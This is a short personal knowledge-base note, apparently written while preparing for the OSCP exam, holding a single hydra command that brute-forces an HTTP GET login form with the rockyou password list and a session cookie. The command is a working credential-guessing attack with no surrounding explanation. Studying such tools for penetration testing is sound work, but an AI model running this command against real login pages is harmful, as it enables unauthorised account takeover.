# hydra brute force HTTP Get Request
```bash
hydra $IP -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15
```

` zet/20221003150742/README.md `

# Related

- [20221014185908](/zet/20221014185908/README.md) kb file named kb/hacking/commands/hydra.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150744](/zet/20221003150744/README.md) hydra brute force
- ~/kb/hacking/commands/hydra.md

Tags:

    #command #hacking #hydra 
